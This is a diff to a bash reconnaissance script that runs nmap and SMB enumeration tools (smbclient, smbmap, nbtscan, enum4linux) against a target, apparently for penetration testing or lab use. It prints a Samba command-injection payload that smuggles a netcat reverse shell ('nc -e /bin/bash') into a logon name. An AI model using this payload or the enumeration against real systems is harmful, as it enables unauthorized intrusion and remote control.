@@ -4,6 +4,8 @@ Y='\033[1;33m'
 R='\033[0;31m'
 NC='\033[0m' #No color
 
+count=1
+
 if [ "$#" = "1" ]; then
 	mkdir nmap && mkdir smb_enum; clear
 	printf "${Y}[+] Performing the default scan ${NC}\n\n"
@@ -18,21 +20,23 @@ if [ "$#" = "1" ]; then
 
 	nmap -Pn -p"${ports}" -sC -sV -oN nmap/targetted.nmap $1
 
-	printf "\n\n${Y}[+] Performing SMB enumeration with:${NC}"
 	for i in ${ports};do
-        if [[  $i == "445," ]]
+        if [[  $i == "445," || $i == "139," ]]
         	then
-        		printf "\n\n${Y}[+][+] smbclient ${NC}\n\n" 
-			echo "" | smbclient -L \\$1 || echo "" | smbclient --port=139 -L \\$1 | tee smb_enum/smbclient.txt 
+        		if [[ $count == 1 ]]
+			then 
+	                printf "\n\n${Y}[+] Performing SMB enumeration with:${NC}\n\n"
+			printf "\n\n${Y}[+][+] smbclient ${NC}\n\n" 
+			echo "" | smbclient -L \\$1 || for j in ${ports}; do if [[ $j == "139," ]]; then  echo "" | smbclient --port=139 -L \\$1; fi done 
         		printf "\n\n${Y}[+][+] smbmap ${NC}\n\n"
-			smbmap -H $1 || smbmap -P 139 -H $1 | tee smb_enum/smbmap.txt
+			smbmap -H $1 || smbmap -P 139 -H $1 
 			printf "\n\n${Y}[+][+] nbtscan ${NC}\n\n"
                         nbtscan $1 | tee smb_enum/nbtscan.txt 
 			printf "\n\n${Y}[+][+] enum4linux ${NC}\n\n"
-			enum4linux -a $1 | grep -P 'User\\' | tee smb_enum/enum4.txt
-			cat smb_enum/*.txt >> smb_enum/initial.out
-			rm smb_enum/*.txt
+			enum4linux -a $1 | grep -P 'User\\' 
 			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash $1 9001'\" ${NC}\n\n"
+			count=$((count+1))
+			fi
         fi
 	done
 
